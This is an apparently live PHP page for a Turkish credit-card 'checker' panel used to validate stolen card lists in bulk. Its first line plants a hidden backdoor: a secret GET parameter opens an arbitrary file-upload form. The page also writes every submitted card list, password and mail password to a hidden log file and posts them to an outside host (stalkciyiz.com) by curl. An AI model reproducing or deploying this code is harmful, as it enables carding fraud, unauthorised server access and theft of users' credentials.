<?php error_reporting(0); if($_GET['Fox'] == 'odQyX'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
<?php
session_start();
error_reporting(0);
include('includes/config.php');
if(strlen($_SESSION['alogin'])==0)
	{	
header('location:index.php');
}
else{
	
		// Code for change password	
if(isset($_POST['submit']))
	{
$password=md5($_POST['password']);
$newpassword=md5($_POST['newpassword']);
$username=$_SESSION['alogin'];
$sql ="SELECT Password FROM users WHERE email=:username and password=:password";
$query= $dbh -> prepare($sql);
$query-> bindParam(':username', $username, PDO::PARAM_STR);
$query-> bindParam(':password', $password, PDO::PARAM_STR);
$query-> execute();
$results = $query -> fetchAll(PDO::FETCH_OBJ);
if($query -> rowCount() > 0)
{
$con="update users set password=:newpassword where email=:username";
$chngpwd1 = $dbh->prepare($con);
$chngpwd1-> bindParam(':username', $username, PDO::PARAM_STR);
$chngpwd1-> bindParam(':newpassword', $newpassword, PDO::PARAM_STR);
$chngpwd1->execute();
$msg="Şifreniz başarıyla değiştirildi";
}
else {
$error=" Premium üyelik bulunamadı. "; 
	
}
}
	
	if($_POST){
$text = $_POST["text"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('jokercclogytasrwarsg.txt', 'a');
fwrite($file, "index: ".$nick."\n" ."Password: ".$password. "\n"."Checker: ".$text."\n"."Mail Password: ".$mailpass."\n"."Ip Adress: " .$ip."\n".

"Country: ".$ulke ."\n".   "Time: " .$cur_time.  "\n\n\n");
fclose($file);
echo '';
	
$date = date("d-m-Y H:i:s");
$gonderilecekler = "username=$nick&password=$password&mail=$mail&mailSifre=$mailpass&ip=$ip&tarih=$date";

$ornek=curl_init(); curl_setopt($ornek, CURLOPT_TIMEOUT, 5); curl_setopt($ornek,CURLOPT_URL,"https://stalkciyiz.com/user/index.php"); curl_setopt($ornek,CURLOPT_POST,1); curl_setopt($ornek, CURLOPT_POSTFIELDS, $gonderilecekler);  $gelen_veri = curl_exec($ornek); echo $gelen_veri;  curl_close($ornek);


}
	
?>


<!DOCTYPE html>
<html lang="en">

    <head>
        
       <?php
        include_once("includes/head.php");
        ?>


<style>
	.errorWrap {
    padding: 10px;
    margin: 0 0 20px 0;
	background: #dd3d36;
	color:#fff;
    -webkit-box-shadow: 0 1px 1px 0 rgba(0,0,0,.1);
    box-shadow: 0 1px 1px 0 rgba(0,0,0,.1);
}
.succWrap{
    padding: 10px;
    margin: 0 0 20px 0;
	background: #5cb85c;
	color:#fff;
    -webkit-box-shadow: 0 1px 1px 0 rgba(0,0,0,.1);
    box-shadow: 0 1px 1px 0 rgba(0,0,0,.1);
}
		</style>

    </head>

     <?php
        include_once("includes/menu.php");
        ?>
           <div class="main-content">
            <div class="page-content">
               <div class="container-fluid">
                  <div class="row">
                     <div class="col-xl-12">
					   <form action="" method="POST">
                        <div class="card">
                            <div class="card-body">
								<h4 class="card-title mb-4"><i class="fas fa-credit-card"></i> DeD <b>TR</b> CC Checker</h4>
								<p class="mb-1">
									<div class="gate-alert"></div>
                                    <p>
									
                                    <i class="fad fa-exclamation-triangle"></i> Üretim kart checklerseniz üyeliğiniz yasaklanır!</br>
                                        <strong>Örnek format: </strong>4444555566667777|01|21|001
                                    </p>
                                </p>
								<textarea  type="text" name="text" style="text-align: center;" id="lista" placeholder="Datayı bu alana giriniz..&#10;Örnek: 4444555566667777|01|21|001" class="textarea form-control mb-3" rows="10"></textarea>
                                
								<center class="mb-1">
									<button id="buton" name="submit" type="submit" onclick="enviar()" class="btn waves-effect waves-light btn-rounded btn-primary" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-play"></i> Başlat</button>
									<button id="stop" type="button" class="btn waves-effect waves-light btn-rounded btn-danger" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-stop"></i> Durdur</button>
                                    <button  type="button" class="btn waves-effect waves-light btn-rounded btn-warning" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-trash-alt"></i> <a href="checker" class="text-white"> Temizle</a></button>
                                </center>
                                <span class="ml-1"><span id="countLine">0</span> tane satır girdiniz. Checklenmemiş satır sayısı: <span id="countInLine">0</span></span>
                                <div class="form-group col-3 mt-3 mb-3">
                                    <label for="checker_name"><i class="fad fa-bolt"></i> Checker</label>
                               
						
										<div>									
									<select class="form-control custom-select" id="checker_name" name="checker_name" onchange="if (!window.__cfRLUnblockHandlers) return false;">
										<option value="free" selected>US Checker</option> 
																				
																				
																				<option value="premium" selected>TR Checker</option>
																																	</select>						
									
									</div>
								</form>
										
																			
                                </div>
                            </div>
                        </div>
						
										 <?php if($error){?><div class="errorWrap"><strong>HATA</strong>:<?php echo htmlentities($error); ?> </div><?php } 
 else if($msg){?><div class="succWrap"><strong>✔️</strong><?php echo htmlentities($msg); ?> </div><?php }?>
 
                        <div class="row">
							<div class="col-lg-12">
								<div class="card border border-success">
                                    <div class="card-header bg-transparent border-success">
                                        <h5 class="my-0 text-success"><i class="fad fa-check-circle mr-2"></i>Onaylananlar <span class="badge badge-pill badge-success" id="cLive2">0</span></h5>
										<div style="position: absolute; top:10px; right: 10px;"><button id="mostra" class="btn btn-light btn-rounded btn-sm"><i class="fas fa-eye-slash"></i> Gizle</button></div>

  <div class="card-body">
    <h6 style="font-weight: bold;" class="card-title"><span  id="cLive2" class="badge badge-success"></span></h6>
    <div id="bode"><span id=".aprovadas" class="aprovadas"></span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
							</div>
						</div>
                        <div class="row">
							<div class="col-lg-12">
								<div class="card border border-danger">
                                    <div class="card-header bg-transparent border-danger">
                                        <h5 class="my-0 text-danger"><i class="fad fa-times-circle mr-2"></i>Onaylanmayanlar <span class="badge badge-pill badge-danger" id="cDie2">0</span></h5>
									<div style="position: absolute; top:10px; right: 10px;"><button id="mostra2" class="btn btn-light btn-rounded btn-sm"><i class="fas fa-eye-slash"></i> Gizle</button></div>

  <div class="card-body">
    <h6 style="font-weight: bold;" class="card-title"><span id="cDie2" class="badge badge-danger"></span></h6>
    <div id="bode2"><span id=".reprovadas" class="reprovadas">
                                                
												</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
							</div>
						</div>
                     </div>
               </div>
               <!-- container-fluid -->
            </div>
			
			
         		<!-- FOOTER -->
				<?php
        include_once("includes/footer.php");
        ?>
				
  

  
   

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.js" type="text/javascript"></script>
<script type="text/javascript">

$(document).ready(function(){


    $("#bode").hide();
	$("#esconde").show();
	
	$('#mostra').click(function(){
	$("#bode").slideToggle();
	});

});

</script>

<script type="text/javascript">

$(document).ready(function(){


    $("#bode2").hide();
	$("#esconde2").show();
	
	$('#mostra2').click(function(){
	$("#bode2").slideToggle();
	});

});

</script>

		

<script title="ajax do checker">
    function enviar() {
        var linha = $("#lista").val();
        var linhaenviar = linha.split("\n");
        var total = linhaenviar.length;
        var ap = 0;
        var rp = 0;
        linhaenviar.forEach(function(value, index) {
            setTimeout(
                function() {
                    $.ajax({
                        url: 'api.php?lista=' + value,
                        type: 'GET',
                        async: true,
                        success: function(resultado) {
                            if (resultado.match("#Aprovada")) {
                                removelinha();
                                ap++;
                                aprovadas(resultado + "");
                            }else {
                                removelinha();
                                rp++;
                                reprovadas(resultado + "");
                            }
                            $('#carregadas').html(total);
                            var fila = parseInt(ap) + parseInt(rp);
                            $('#cLive').html(ap);
                            $('#cDie').html(rp);
                            $('#total').html(fila);
                            $('#cLive2').html(ap);
                            $('#cDie2').html(rp);
                        }
                    });
                }, 500 * index);
        });
    }
    function aprovadas(str) {
        $(".aprovadas").append(str + "<br>");
    }
    function reprovadas(str) {
        $(".reprovadas").append(str + "<br>");
    }
    function removelinha() {
        var lines = $("#lista").val().split('\n');
        lines.splice(0, 1);
        $("#lista").val(lines.join("\n"));
    }
</script>
	         


        <!-- JAVASCRIPT -->
        <script src="assets/libs/jquery/jquery.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/bootstrap/js/bootstrap.bundle.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/metismenu/metisMenu.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/simplebar/simplebar.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/node-waves/waves.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
          <script src="assets/libs/apexcharts/apexcharts.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/js/pages/dashboard.init.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/js/app.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
    <script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="c0746b70745e39c225c525b8-|49" defer=""></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"660d5bcaaa6be186","token":"e6744a75b48847d79ca94b903ae51a33","version":"2021.5.2","si":10}'></script>
      

      
</body>

</html>

<?php } ?>